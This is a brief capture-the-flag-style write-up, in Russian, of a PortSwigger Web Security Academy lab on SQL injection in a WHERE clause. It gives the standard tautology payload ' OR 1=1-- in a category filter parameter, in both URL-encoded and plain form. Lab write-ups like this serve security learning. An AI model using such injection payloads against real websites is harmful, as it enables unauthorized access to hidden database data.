# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data WRITEUP

| | |
|---|---|
| **Платформа / Событие** | PortSwigger Web Security Academy |
| **Категория** | sqli |
| **Сложность** | — |
| **Статус** | done |
| **Дата решения** | 2026-11-15 |
| **Ссылка на таск** | — |

Ничего интересного, использовался стандартейший payload с верным условием, закрытием прошлого условия и комментарием

## Payload

```bash
filter?category=%27%20OR%201=1--
```

```bash
filter?category=' OR 1=1--
```

![Пикча](fig.png)
